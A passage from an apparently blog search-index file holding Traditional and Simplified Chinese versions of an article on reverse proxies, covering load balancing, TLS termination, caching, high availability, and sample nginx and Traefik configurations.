https:&#x2F;&#x2F;app1.example.com:8080 → 服務 1 https:&#x2F;&#x2F;app2.example.com:8081 → 服務 2 https:&#x2F;&#x2F;app3.example.com:8082 → 服務 3 有反向代理： https:&#x2F;&#x2F;example.com&#x2F;app1 → 服務 1 (10.0.1.5:8080) https:&#x2F;&#x2F;example.com&#x2F;app2 → 服務 2 (10.0.1.6:8081) https:&#x2F;&#x2F;example.com&#x2F;app3 → 服務 3 (10.0.1.7:8082) 路由配置： location &#x2F;app1 &#123; proxy_pass http:&#x2F;&#x2F;10.0.1.5:8080; &#125; location &#x2F;app2 &#123; proxy_pass http:&#x2F;&#x2F;10.0.1.6:8081; &#125; location &#x2F;api &#123; proxy_pass http:&#x2F;&#x2F;api-cluster; &#125; 優點： **單一網域：**更容易記住和管理 **無 CORS 問題：**所有服務看起來來自同一來源 **靈活部署：**移動服務而不改變客戶端 URL **微服務友好：**透明地路由到不同服務 6. 零停機部署 **問題：**部署更新需要讓伺服器離線。 **解決方案：**反向代理實現滾動部署。 部署流程： 初始狀態： 代理 → 伺服器 1 (v1.0) ✅ → 伺服器 2 (v1.0) ✅ → 伺服器 3 (v1.0) ✅ 步驟 1：更新伺服器 1 代理 → 伺服器 1 (v1.1) 🔄（從池中移除） → 伺服器 2 (v1.0) ✅ → 伺服器 3 (v1.0) ✅ 步驟 2：將伺服器 1 加回 代理 → 伺服器 1 (v1.1) ✅ → 伺服器 2 (v1.0) ✅ → 伺服器 3 (v1.0) ✅ 步驟 3-4：對伺服器 2 和 3 重複 代理 → 伺服器 1 (v1.1) ✅ → 伺服器 2 (v1.1) ✅ → 伺服器 3 (v1.1) ✅ 健康檢查： upstream backend &#123; server 10.0.1.5:8080 max_fails&#x3D;3 fail_timeout&#x3D;30s; server 10.0.1.6:8080 max_fails&#x3D;3 fail_timeout&#x3D;30s; server 10.0.1.7:8080 max_fails&#x3D;3 fail_timeout&#x3D;30s; &#125; 如果伺服器未通過健康檢查，代理會自動將其從輪換中移除。 它是另一個故障點嗎？ **簡短回答：**是的，但這是一個經過計算的權衡。 **詳細回答：**當正確實施時，好處遠遠超過風險。 擔憂 客戶端 → 反向代理 → 後端伺服器 ↓ 單點故障？ 如果反向代理故障，所有服務都會變得無法訪問——即使後端伺服器是健康的。 現實：緩解策略 1. 高可用性設置 主動-被動： flowchart TD Client[\"👤 客戶端\"] VIP[\"🌐 虛擬 IP(203.0.113.10)\"] RP1[\"🚪 反向代理 1(主動)\"] RP2[\"🚪 反向代理 2(待命)\"] subgraph Backend[\"後端伺服器\"] App1[\"🖥️ 伺服器 1\"] App2[\"🖥️ 伺服器 2\"] end Client --> VIP VIP --> RP1 VIP -.->|\"故障轉移\"| RP2 RP1 --> Backend RP2 -.-> Backend RP1 |\"心跳\"| RP2 style RP1 fill:#c8e6c9 style RP2 fill:#ffecb3 style Backend fill:#e8f5e9 運作方式： 兩個反向代理共享一個虛擬 IP 主要處理所有流量 次要透過心跳監控主要 如果主要失敗，次要接管虛擬 IP 故障轉移時間：1-3 秒 主動-主動： 客戶端 → DNS 輪詢 ├─&gt; 反向代理 1（50% 流量） └─&gt; 反向代理 2（50% 流量） ↓ 後端伺服器 優點： 兩個代理都處理流量 更好的資源利用 自動負載分配 如果一個失敗，另一個處理 100% 2. 反向代理比後端更簡單 複雜度比較： 組件 複雜度 故障機率 後端應用 高（業務邏輯、資料庫、依賴項） 較高 反向代理 低（路由、轉發） 較低 為什麼反向代理更可靠： **無狀態：**沒有資料庫，沒有會話（通常） **簡單邏輯：**只是路由和轉發 **久經考驗：**nginx/HAProxy/Traefik 很成熟 **更少依賴：**最少的外部服務 **更容易監控：**簡單的健康檢查 故障率範例： 後端應用程式：99.5% 正常運行時間（每年 43.8 小時停機） 反向代理：99.95% 正常運行時間（每年 4.38 小時停機） 使用 HA 反向代理：99.99% 正常運行時間（每年 52 分鐘停機） 3. 監控和警報 健康檢查監控： # Prometheus 監控範例 - alert: ReverseProxyDown expr: up&#123;job&#x3D;&quot;reverse-proxy&quot;&#125; &#x3D;&#x3D; 0 for: 1m annotations: summary: &quot;反向代理故障&quot; description: &quot;反向代理 &#123;&#123; $labels.instance &#125;&#125; 已停機 1 分鐘&quot; 自動恢復： # Systemd 自動重啟 [Service] Restart&#x3D;always RestartSec&#x3D;5s 監控指標： 請求速率 回應時間 錯誤率（4xx、5xx） 後端健康狀態 連接數 CPU/記憶體使用 4. 地理分佈 多區域設置： 全球 DNS（GeoDNS） ↓ ┌─────────┴─────────┐ ↓ ↓ 美國區域 歐洲區域 反向代理 反向代理 ↓ ↓ 美國後端 歐洲後端 優點： **區域故障轉移：**如果美國區域失敗，流量轉到歐洲 **降低延遲：**用戶連接到最近的區域 **災難恢復：**完整區域可以失敗而不會完全中斷 風險比較 沒有反向代理： 風險： ❌ 每個後端暴露於攻擊 ❌ 無負載平衡（單一伺服器過載） ❌ 複雜的 SSL 管理 ❌ 無快取（更高的後端負載） ❌ 困難的部署 ❌ 無集中式監控 故障模式： - 個別伺服器被壓垮 - DDoS 攻擊擊垮所有伺服器 - SSL 憑證在一個伺服器上過期 有反向代理： 風險： ⚠️ 反向代理是單點（使用 HA 緩解） 優點： ✅ 受保護的後端 ✅ 負載分配 ✅ 集中式 SSL ✅ 快取減少負載 ✅ 零停機部署 ✅ 集中式監控 故障模式： - 反向代理失敗（但 HA 設置可防止這種情況） - 比後端故障的機率低得多 結論 反向代理是單點故障嗎？ 技術上是的，但： 它比後端應用程式更可靠 HA 設置消除了單點 好處遠遠超過風險 業界標準是有原因的 風險評估： 情境 可用性 複雜度 成本 無反向代理 99.5% 低 低 單一反向代理 99.95% 中 中 HA 反向代理 99.99% 中高 中高 多區域 HA 99.999% 高 高 💡 最佳實踐對於生產系統： **最低要求：**具有自動重啟的單一反向代理 **建議：**主動-被動 HA 設置 **企業：**主動-主動多區域 即使是單一反向代理也比直接暴露後端更可靠。 流行的反向代理解決方案 nginx **最適合：**高效能靜態內容和簡單路由 優點： 極快且輕量 低記憶體佔用 久經考驗（為 30%+ 的頂級網站提供支援） 優秀的文件 缺點： 配置可能很複雜 配置更改需要重新載入 有限的動態配置 **使用案例：**傳統 Web 應用程式、高流量網站 Traefik **最適合：**Docker/Kubernetes 環境、微服務 優點： 自動服務發現 動態配置（無需重新載入） 內建 Let’s Encrypt 支援 漂亮的儀表板 缺點： 比 nginx 使用更多資源 學習曲線較陡 較年輕的專案（較不成熟） **使用案例：**基於容器的部署、雲原生應用程式 HAProxy **最適合：**進階負載平衡、TCP/UDP 代理 優點： 極其可靠 進階負載平衡演算法 優秀的效能監控 TCP/UDP 支援（不僅是 HTTP） 缺點： 配置語法獨特 不如其他直觀 主要專注於負載平衡 **使用案例：**高可用性設置、複雜路由需求 比較 功能 nginx Traefik HAProxy 效能 ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ 易用性 ⭐⭐⭐ ⭐⭐⭐⭐ ⭐⭐ Docker 整合 ⭐⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐ 動態配置 ⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐ 成熟度 ⭐⭐⭐⭐⭐ ⭐⭐⭐ ⭐⭐⭐⭐⭐ 資源使用 ⭐⭐⭐⭐⭐ ⭐⭐⭐ ⭐⭐⭐⭐ 快速入門範例 nginx 反向代理 # &#x2F;etc&#x2F;nginx&#x2F;nginx.conf http &#123; # 定義後端伺服器 upstream backend &#123; server 10.0.1.5:8080 weight&#x3D;3; server 10.0.1.6:8080 weight&#x3D;2; server 10.0.1.7:8080 weight&#x3D;1; &#125; # 速率限制 limit_req_zone $binary_remote_addr zone&#x3D;api:10m rate&#x3D;10r&#x2F;s; server &#123; listen 80; server_name example.com; # 將 HTTP 重定向到 HTTPS return 301 https:&#x2F;&#x2F;$server_name$request_uri; &#125; server &#123; listen 443 ssl http2; server_name example.com; # SSL 配置 ssl_certificate &#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;example.com.crt; ssl_certificate_key &#x2F;etc&#x2F;ssl&#x2F;private&#x2F;example.com.key; ssl_protocols TLSv1.2 TLSv1.3; # 日誌 access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log; # 靜態檔案（快取） location ~* \\.(jpg|jpeg|png|gif|css|js)$ &#123; proxy_pass http:&#x2F;&#x2F;backend; proxy_cache my_cache; proxy_cache_valid 200 1d; expires 1d; add_header Cache-Control &quot;public, immutable&quot;; &#125; # API 端點（速率限制） location &#x2F;api &#123; limit_req zone&#x3D;api burst&#x3D;20 nodelay; proxy_pass http:&#x2F;&#x2F;backend; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; # 超時 proxy_connect_timeout 5s; proxy_send_timeout 10s; proxy_read_timeout 10s; &#125; # 健康檢查端點 location &#x2F;health &#123; access_log off; return 200 &quot;OK\\n&quot;; add_header Content-Type text&#x2F;plain; &#125; &#125; &#125; Traefik 與 Docker # docker-compose.yml version: &#39;3.8&#39; services: traefik: image: traefik:v2.10 command: - &quot;--api.dashboard&#x3D;true&quot; - &quot;--providers.docker&#x3D;true&quot; - &quot;--entrypoints.web.address&#x3D;:80&quot; - &quot;--entrypoints.websecure.address&#x3D;:443&quot; - &quot;--certificatesresolvers.myresolver.acme.email&#x3D;admin@example.com&quot; - &quot;--certificatesresolvers.myresolver.acme.storage&#x3D;&#x2F;letsencrypt&#x2F;acme.json&quot; - &quot;--certificatesresolvers.myresolver.acme.httpchallenge.entrypoint&#x3D;web&quot; ports: - &quot;80:80&quot; - &quot;443:443&quot; volumes: - &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock:ro - .&#x2F;letsencrypt:&#x2F;letsencrypt labels: - &quot;traefik.http.routers.dashboard.rule&#x3D;Host(&#96;traefik.example.com&#96;)&quot; - &quot;traefik.http.routers.dashboard.service&#x3D;api@internal&quot; app1: image: myapp:latest labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.app1.rule&#x3D;Host(&#96;app1.example.com&#96;)&quot; - &quot;traefik.http.routers.app1.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.app1.tls.certresolver&#x3D;myresolver&quot; - &quot;traefik.http.services.app1.loadbalancer.server.port&#x3D;8080&quot; app2: image: myapp:latest labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.app2.rule&#x3D;Host(&#96;app2.example.com&#96;)&quot; - &quot;traefik.http.routers.app2.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.app2.tls.certresolver&#x3D;myresolver&quot; - &quot;traefik.http.services.app2.loadbalancer.server.port&#x3D;8080&quot; 結論 反向代理是現代 Web 架構中的無名英雄。它們提供負載平衡、安全性、快取和簡化路由——同時比它們保護的應用程式更可靠。 關鍵要點： 反向代理位於客戶端和後端伺服器之間，智慧地路由請求 對企業設計至關重要，因為負載平衡、安全性、SSL 終止和快取 是的，它是潛在的故障點，但 HA 設置和固有的簡單性使其比替代方案更可靠 當正確實施時，好處遠遠超過風險 生產部署的業界標準 值得這種複雜性嗎？ 對於任何超出簡單單伺服器設置的情況，絕對值得。操作優勢、安全改進和靈活性使反向代理在現代基礎設施中不可或缺。 快速決策指南： **小型專案，單一伺服器：**可選（但仍建議） **多個伺服器或服務：**絕對使用 **生產系統：**使用 HA 反向代理設置 **企業/關鍵系統：**多區域 HA 設置 問題不是是否使用反向代理——而是選擇哪一個以及如何使其高度可用。🚀 資源 **nginx 文件：**官方 nginx 指南 **Traefik 文件：**完整的 Traefik 參考 **HAProxy 文件：**HAProxy 配置指南 **Let’s Encrypt：**免費 SSL 憑證 **Cloudflare：**全球反向代理/CDN 服務","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Infrastructure","slug":"Infrastructure","permalink":"https://neo01.com/tags/Infrastructure/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"}],"lang":"zh-TW"},{"title":"理解反向代理：企业架构中的无名英雄","slug":"2024/09/Understanding-Reverse-Proxy-zh-CN","date":"un00fin00","updated":"un22fin22","comments":false,"path":"/zh-CN/2024/09/Understanding-Reverse-Proxy/","permalink":"https://neo01.com/zh-CN/2024/09/Understanding-Reverse-Proxy/","excerpt":"你是否好奇用户和后端服务器之间有什么？了解为什么反向代理在企业设计中不可或缺，以及它是否真的是另一个故障点。","text":"你访问一个网站。你点击一个按钮。在幕后，你的请求并不会直接到达运行应用程序的服务器。相反，它会先碰到其他东西——反向代理。 大多数用户从不知道它的存在。但对于企业架构师来说，它是不可或缺的。 什么是反向代理？ 反向代理是一个位于客户端和后端服务器之间的服务器，将客户端请求转发到适当的后端服务器，并将服务器的响应返回给客户端。 关键区别： **正向代理：**位于客户端前面，代表客户端向服务器转发请求 **反向代理：**位于服务器前面，代表服务器向客户端转发请求 现实世界类比 将反向代理想象成酒店礼宾部： 没有反向代理： 客人直接敲员工的门（厨师、管家、经理） 每个员工处理自己的门 多个客人到达时一片混乱 没人知道谁忙或谁有空 有反向代理： 所有客人先到礼宾台 礼宾知道该联系哪位员工 均匀分配请求 优雅地处理繁忙时段 员工可以不受干扰地工作 礼宾不做实际工作——他们有效地路由请求并保护员工不被压垮。 反向代理如何运作？ flowchart LR Client[\"👤 客户端(浏览器)\"] RP[\"🚪 反向代理(nginx/Traefik)\"] subgraph Backend[\"后端服务器\"] App1[\"🖥️ 应用服务器 1\"] App2[\"🖥️ 应用服务器 2\"] App3[\"🖥️ 应用服务器 3\"] end Client -->|\"1. 请求\"| RP RP -->|\"2. 转发\"| App1 RP -.->|\"负载均衡\"| App2 RP -.->|\"负载均衡\"| App3 App1 -->|\"3. 响应\"| RP RP -->|\"4. 返回\"| Client style RP fill:#fff3e0 style Backend fill:#e8f5e9 请求流程： 客户端发送请求 → https://example.com/api/users DNS 解析 → 指向反向代理 IP 反向代理接收 → 检查请求（URL、标头、方法） 路由决策 → 决定使用哪个后端服务器 转发请求 → 发送到后端服务器 后端处理 → 生成响应 代理返回 → 将响应发送回客户端 客户端看到的： 请求：https:&#x2F;&#x2F;example.com&#x2F;api&#x2F;users 响应：200 OK 实际发生的： 客户端 → 反向代理 (203.0.113.10) 反向代理 → 后端服务器 (10.0.1.5:8080) 后端服务器 → 反向代理 反向代理 → 客户端 客户端永远不知道后端服务器的真实 IP 地址或端口。 为什么企业设计需要反向代理 1. 负载均衡 **问题：**单一服务器无法处理高峰时段的所有流量。 **解决方案：**反向代理在多个服务器之间分配请求。 100 请求&#x2F;秒 → 反向代理 ├─&gt; 服务器 1 (33 请求&#x2F;秒) ├─&gt; 服务器 2 (33 请求&#x2F;秒) └─&gt; 服务器 3 (34 请求&#x2F;秒) 负载均衡算法： **轮询：**依序分配请求 **最少连接：**发送到活动连接最少的服务器 **IP 哈希：**同一客户端总是到同一服务器（会话持久性） **加权：**根据服务器容量分配 实际影响： 没有负载均衡： 服务器 1：过载（崩溃） 服务器 2：闲置 服务器 3：闲置 结果：服务中断 有负载均衡： 所有服务器均匀分担负载 没有单一过载点 如果一个失败，优雅降级 2. SSL/TLS 终止 **问题：**每个后端服务器都需要 SSL 证书和加密开销。 **解决方案：**反向代理处理所有 SSL/TLS 加密/解密。 flowchart LR Client[\"👤 客户端\"] RP[\"🚪 反向代理\"] App1[\"🖥️ 应用服务器 1\"] App2[\"🖥️ 应用服务器 2\"] Client |\"🔒 HTTPS(加密)\"| RP RP |\"HTTP(明文)\"| App1 RP |\"HTTP(明文)\"| App2 style RP fill:#fff3e0 优点： **单一证书：**在一个地方管理 SSL 证书 **降低 CPU 负载：**后端服务器不解密流量 **简化更新：**更新 SSL 配置无需触碰应用程序 **集中式安全：**统一强制执行 TLS 版本和加密套件 成本节省： 没有反向代理：10 服务器 × $50/证书 = $500/年 有反向代理：1 服务器 × $50/证书 = $50/年 3. 安全层 **问题：**后端服务器直接暴露于互联网攻击。 **解决方案：**反向代理充当安全屏障。 保护机制： 隐藏后端基础设施： 客户端看到：https:&#x2F;&#x2F;api.example.com 真实后端：http:&#x2F;&#x2F;10.0.1.5:8080（隐藏） 速率限制： # 限制每个 IP 每秒 10 个请求 limit_req_zone $binary_remote_addr zone&#x3D;api:10m rate&#x3D;10r&#x2F;s; IP 过滤： # 封锁特定 IP deny 192.168.1.100; # 只允许特定范围 allow 10.0.0.0&#x2F;8; deny all; DDoS 缓解： 每个 IP 的连接限制 请求速率限制 自动封锁滥用 IP Web 应用程序防火墙（WAF）： SQL 注入检测 XSS 攻击预防 恶意负载过滤 4. 缓存 **问题：**后端服务器重复生成相同的响应。 **解决方案：**反向代理缓存响应，减少后端负载。 缓存流程： 第一次请求： 客户端 → 代理（缓存未命中）→ 后端 → 生成响应 ← 存储在缓存 ← 返回 后续请求： 客户端 → 代理（缓存命中）→ 返回缓存的响应 （不触碰后端） 性能影响： 情境 响应时间 后端负载 无缓存 200ms 100% 50% 缓存命中 110ms 50% 90% 缓存命中 38ms 10% 缓存示例： # 缓存静态资源 1 天 location ~* \\.(jpg|jpeg|png|css|js)$ &#123; proxy_cache my_cache; proxy_cache_valid 200 1d; proxy_pass http:&#x2F;&#x2F;backend; &#125; 5. 简化路由 **问题：**多个服务在不同端口/服务器上，对客户端来说很复杂。 **解决方案：**单一入口点，基于路径的路由。 没有反向代理： https:&#x2F;&#x2F;app1.example.com:8080 → 服务 1 https:&#x2F;&#x2F;app2.example.com:8081 → 服务 2 https:&#x2F;&#x2F;app3.example.com:8082 → 服务 3 有反向代理： https:&#x2F;&#x2F;example.com&#x2F;app1 → 服务 1 (10.0.1.5:8080) https:&#x2F;&#x2F;example.com&#x2F;app2 → 服务 2 (10.0.1.6:8081) https:&#x2F;&#x2F;example.com&#x2F;app3 → 服务 3 (10.0.1.7:8082) 路由配置： location &#x2F;app1 &#123; proxy_pass http:&#x2F;&#x2F;10.0.1.5:8080; &#125; location &#x2F;app2 &#123; proxy_pass http:&#x2F;&#x2F;10.0.1.6:8081; &#125; location &#x2F;api &#123; proxy_pass http:&#x2F;&#x2F;api-cluster; &#125; 优点： **单一域名：**更容易记住和管理 **无 CORS 问题：**所有服务看起来来自同一来源 **灵活部署：**移动服务而不改变客户端 URL **微服务友好：**透明地路由到不同服务 6. 零停机部署 **问题：**部署更新需要让服务器离线。 **解决方案：**反向代理实现滚动部署。 部署流程： 初始状态： 代理 → 服务器 1 (v1.0) ✅ → 服务器 2 (v1.0) ✅ → 服务器 3 (v1.0) ✅ 步骤 1：更新服务器 1 代理 → 服务器 1 (v1.1) 🔄（从池中移除） → 服务器 2 (v1.0) ✅ → 服务器 3 (v1.0) ✅ 步骤 2：将服务器 1 加回 代理 → 服务器 1 (v1.1) ✅ → 服务器 2 (v1.0) ✅ → 服务器 3 (v1.0) ✅ 步骤 3-4：对服务器 2 和 3 重复 代理 → 服务器 1 (v1.1) ✅ → 服务器 2 (v1.1) ✅ → 服务器 3 (v1.1) ✅ 健康检查： upstream backend &#123; server 10.0.1.5:8080 max_fails&#x3D;3 fail_timeout&#x3D;30s; server 10.0.1.6:8080 max_fails&#x3D;3 fail_timeout&#x3D;30s; server 10.0.1.7:8080 max_fails&#x3D;3 fail_timeout&#x3D;30s; &#125; 如果服务器未通过健康检查，代理会自动将其从轮换中移除。 它是另一个故障点吗？ **简短回答：**是的，但这是一个经过计算的权衡。 **详细回答：**当正确实施时，好处远远超过风险。 担忧 客户端 → 反向代理 → 后端服务器 ↓ 单点故障？ 如果反向代理故障，所有服务都会变得无法访问——即使后端服务器是健康的。 现实：缓解策略 1. 高可用性设置 主动-被动： flowchart TD Client[\"👤 客户端\"] VIP[\"🌐 虚拟 IP(203.0.113.10)\"] RP1[\"🚪 反向代理 1(主动)\"] RP2[\"🚪 反向代理 2(待命)\"] subgraph Backend[\"后端服务器\"] App1[\"🖥️ 服务器 1\"] App2[\"🖥️ 服务器 2\"] end Client --> VIP VIP --> RP1 VIP -.->|\"故障转移\"| RP2 RP1 --> Backend RP2 -.-> Backend RP1 |\"心跳\"| RP2 style RP1 fill:#c8e6c9 style RP2 fill:#ffecb3 style Backend fill:#e8f5e9 运作方式： 两个反向代理共享一个虚拟 IP 主要处理所有流量 次要通过心跳监控主要 如果主要失败，次要接管虚拟 IP 故障转移时间：1-3 秒 主动-主动： 客户端 → DNS 轮询 ├─&gt; 反向代理 1（50% 流量） └─&gt; 反向代理 2（50% 流量） ↓ 后端服务器 优点： 两个代理都处理流量 更好的资源利用 自动负载分配 如果一个失败，另一个处理 100% 2. 反向代理比后端更简单 复杂度比较： 组件 复杂度 故障概率 后端应用 高（业务逻辑、数据库、依赖项） 较高 反向代理 低（路由、转发） 较低 为什么反向代理更可靠： **无状态：**没有数据库，没有会话（通常） **简单逻辑：**只是路由和转发 **久经考验：**nginx/HAProxy/Traefik 很成熟 **更少依赖：**最少的外部服务 **更容易监控：**简单的健康检查 故障率示例： 后端应用程序：99.5% 正常运行时间（每年 43.8 小时停机） 反向代理：99.95% 正常运行时间（每年 4.38 小时停机） 使用 HA 反向代理：99.99% 正常运行时间（每年 52 分钟停机） 3. 监控和警报 健康检查监控： # Prometheus 监控示例 - alert: ReverseProxyDown expr: up&#123;job&#x3D;&quot;reverse-proxy&quot;&#125; &#x3D;&#x3D; 0 for: 1m annotations: summary: &quot;反向代理故障&quot; description: &quot;反向代理 &#123;&#123; $labels.instance &#125;&#125; 已停机 1 分钟&quot; 自动恢复： # Systemd 自动重启 [Service] Restart&#x3D;always RestartSec&#x3D;5s 监控指标： 请求速率 响应时间 错误率（4xx、5xx） 后端健康状态 连接数 CPU/内存使用 4. 地理分布 多区域设置： 全球 DNS（GeoDNS） ↓ ┌─────────┴─────────┐ ↓ ↓ 美国区域 欧洲区域 反向代理 反向代理 ↓ ↓ 美国后端 欧洲后端 优点： **区域故障转移：**如果美国区域失败，流量转到欧洲 **降低延迟：**用户连接到最近的区域 **灾难恢复：**完整区域可以失败而不会完全中断 风险比较 没有反向代理： 风险： ❌ 每个后端暴露于攻击 ❌ 无负载均衡（单一服务器过载） ❌ 复杂的 SSL 管理 ❌ 无缓存（更高的后端负载） ❌ 困难的部署 ❌ 无集中式监控 故障模式： - 个别服务器被压垮 - DDoS 攻击击垮所有服务器 - SSL 证书在一个服务器上过期 有反向代理： 风险： ⚠️ 反向代理是单点（使用 HA 缓解） 优点： ✅ 受保护的后端 ✅ 负载分配 ✅ 集中式 SSL ✅ 缓存减少负载 ✅ 零停机部署 ✅ 集中式监控 故障模式： - 反向代理失败（但 HA 设置可防止这种情况） - 比后端故障的概率低得多 结论 反向代理是单点故障吗？ 技术上是的，但： 它比后端应用程序更可靠 HA 设置消除了单点 好处远远超过风险 行业标准是有原因的 风险评估： 情境 可用性 复杂度 成本 无反向代理 99.5% 低 低 单一反向代理 99.95% 中 中 HA 反向代理 99.99% 中高 中高 多区域 HA 99.999% 高 高 💡 最佳实践对于生产系统： **最低要求：**具有自动重启的单一反向代理 **建议：**主动-被动 HA 设置 **企业：**主动-主动多区域 即使是单一反向代理也比直接暴露后端更可靠。 流行的反向代理解决方案 nginx **最适合：**高性能静态内容和简单路由 优点： 极快且轻量 低内存占用 久经考验（为 30%+ 的顶级网站提供支持） 优秀的文档 缺点： 配置可能很复杂 配置更改需要重新加载 有限的动态配置 **使用案例：**传统 Web 应用程序、高流量网站 Traefik **最适合：**Docker/Kubernetes 环境、微服务 优点： 自动服务发现 动态配置（无需重新加载） 内置 Let’s Encrypt 支持 漂亮的仪表板 缺点： 比 nginx 使用更多资源 学习曲线较陡 较年轻的项目（较不成熟） **使用案例：**基于容器的部署、云原生应用程序 HAProxy **最适合：**高级负载均衡、TCP/UDP 代理 优点： 极其可靠 高级负载均衡算法 优秀的性能监控 TCP/UDP 支持（不仅是 HTTP） 缺点： 配置语法独特 不如其他直观 主要专注于负载均衡 **使用案例：**高可用性设置、复杂路由需求 比较 功能 nginx Traefik HAProxy 性能 ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ 易用性 ⭐⭐⭐ ⭐⭐⭐⭐ ⭐⭐ Docker 集成 ⭐⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐ 动态配置 ⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐ 成熟度 ⭐⭐⭐⭐⭐ ⭐⭐⭐ ⭐⭐⭐⭐⭐ 资源使用 ⭐⭐⭐⭐⭐ ⭐⭐⭐ ⭐⭐⭐⭐ 快速入门示例 nginx 反向代理 # &#x2F;etc&#x2F;nginx&#x2F;nginx.conf http &#123; # 定义后端服务器 upstream backend &#123; server 10.0.1.5:8080 weight&#x3D;3; server 10.0.1.6:8080 weight&#x3D;2; server 10.0.1.7:8080 weight&#x3D;1; &#125; # 速率限制 limit_req_zone $binary_remote_addr zone&#x3D;api:10m rate&#x3D;10r&#x2F;s; server &#123; listen 80; server_name example.com; # 将 HTTP 重定向到 HTTPS return 301 https:&#x2F;&#x2F;$server_name$request_uri; &#125; server &#123; listen 443 ssl http2; server_name example.com; # SSL 配置 ssl_certificate &#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;example.com.crt; ssl_certificate_key &#x2F;etc&#x2F;ssl&#x2F;private&#x2F;example.com.key; ssl_protocols TLSv1.2 TLSv1.3; # 日志 access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log; # 静态文件（缓存） location ~* \\.(jpg|jpeg|png|gif|css|js)$ &#123; proxy_pass http:&#x2F;&#x2F;backend; proxy_cache my_cache; proxy_cache_valid 200 1d; expires 1d; add_header Cache-Control &quot;public, immutable&quot;; &#125; # API 端点（速率限制） location &#x2F;api &#123; limit_req zone&#x3D;api burst&#x3D;20 nodelay; proxy_pass http:&#x2F;&#x2F;backend; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; # 超时 proxy_connect_timeout 5s; proxy_send_timeout 10s; proxy_read_timeout 10s; &#125; # 健康检查端点 location &#x2F;health &#123; access_log off; return 200 &quot;OK\\n&quot;; add_header Content-Type text&#x2F;plain; &#125; &#125; &#125; Traefik 与 Docker # docker-compose.yml version: &#39;3.8&#39; services: traefik: image: traefik:v2.10 command: - &quot;--api.dashboard&#x3D;true&quot; - &quot;--providers.docker&#x3D;true&quot; - &quot;--entrypoints.web.address&#x3D;:80&quot; - &quot;--entrypoints.websecure.address&#x3D;:443&quot; - &quot;--certificatesresolvers.myresolver.acme.email&#x3D;admin@example.com&quot; - &quot;--certificatesresolvers.myresolver.acme.storage&#x3D;&#x2F;letsencrypt&#x2F;acme.json&quot; - &quot;--certificatesresolvers.myresolver.acme.httpchallenge.entrypoint&#x3D;web&quot; ports: - &quot;80:80&quot; - &quot;443:443&quot; volumes: - &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock:ro - .&#x2F;letsencrypt:&#x2F;letsencrypt labels: - &quot;traefik.http.routers.dashboard.rule&#x3D;Host(&#96;traefik.example.com&#96;)&quot; - &quot;traefik.http.routers.dashboard.service&#x3D;api@internal&quot; app1: image: myapp:latest labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.app1.rule&#x3D;Host(&#96;app1.example.com&#96;)&quot; - &quot;traefik.http.routers.app1.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.app1.tls.certresolver&#x3D;myresolver&quot; - &quot;traefik.http.services.app1.loadbalancer.server.port&#x3D;8080&quot; app2: image: myapp:latest labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.app2.rule&#x3D;Host(&#96;app2.example.com&#96;)&quot; - &quot;traefik.http.routers.app2.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.app2.tls.certresolver&#x3D;myresolver&quot; - &quot;traefik.http.services.app2.loadbalancer.server.port&#x3D;8080&quot; 结论 反向代理是现代 Web 架构中的无名英雄。它们提供负载均衡、安全性、缓存和简化路由——同时比它们保护的应用程序更可靠。 关键要点： 反向代理位于客户端和后端服务器之间，智能地路由请求 对企业设计至关重要，因为负载均衡、安全性、SSL 终止和缓存 是的，它是潜在的故障点，但 HA 设置和固有的简单性使其比替代方案更可靠 当正确实施时，好处远远超过风险 生产部署的行业标准 值得这种复杂性吗？ 对于任何超出简单单服务器设置的情况，绝对值得。操作优势、安全改进和灵活性使反向代理在现代基础设施中不可或缺。 快速决策指南： **小型项目，单一服务器：**可选（但仍建议） **多个服务器或服务：**绝对使用 **生产系统：**使用 HA 反向代理设置 **企业/关键系统：**多区域 HA 设置 问题不是是否使用反向代理——而是选择哪一个以及如何使其高度可用。🚀 资源 **nginx 文档：**官方 nginx 指南 **Traefik 文档：**完整的 Traefik 参考 **HAProxy 文档：**HAProxy 配置指南 **Let’s Encrypt：**免费 SSL 证书 **Cloudflare：**全球反向代理/CDN 